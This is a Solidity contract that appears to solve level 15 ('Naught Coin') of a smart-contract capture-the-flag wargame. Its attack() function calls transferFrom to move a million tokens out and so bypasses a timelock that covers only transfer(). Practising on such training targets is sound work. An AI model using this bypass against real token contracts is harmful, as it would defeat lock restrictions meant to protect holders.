// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

interface INaughtoCoin {
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external;
}

contract Level15Solution is Ownable {
    address targetAddress;

    constructor(address _targetAddress) {
        targetAddress = _targetAddress;
    }

    function attack() public onlyOwner {
        INaughtoCoin(targetAddress).transferFrom(
            owner(),
            address(this),
            1000000 ether
        );
    }
}
